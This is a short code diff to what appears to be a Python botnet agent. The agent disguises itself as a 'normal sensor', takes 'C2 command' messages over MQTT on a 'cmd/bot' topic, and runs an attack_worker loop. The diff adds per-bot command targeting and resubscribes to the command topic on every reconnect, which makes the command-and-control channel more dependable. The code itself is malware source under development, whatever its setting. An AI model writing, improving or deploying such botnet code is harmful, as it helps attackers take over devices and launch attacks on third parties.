@@ -64,6 +64,10 @@ def on_message(_cl, _u, msg):
         cmd_str = msg.payload.decode()
         data = {"command": cmd_str}
 
+    target = data.get("target")
+    if target and target not in [SID, "all"]:
+        return
+
     cmd = data.get("command", "")
     seconds = data.get("seconds", 10)
     print(f"[{SID}] received C2 command: {cmd} ({seconds}s)", flush=True)
@@ -114,6 +118,12 @@ def attack_worker():
         time.sleep(0.002)
 
 
+def on_connect(cl, _u, _f, rc, _p=None):
+    if rc == 0:
+        cl.subscribe("cmd/bot")
+        print(f"[{SID}] connected to broker and subscribed to cmd/bot", flush=True)
+
+client.on_connect = on_connect
 client.on_message = on_message
 
 while True:
@@ -123,7 +133,6 @@ while True:
     except OSError:
         time.sleep(2)
 
-client.subscribe("cmd/bot")
 client.loop_start()
 report_status("online, normal sensor")
 
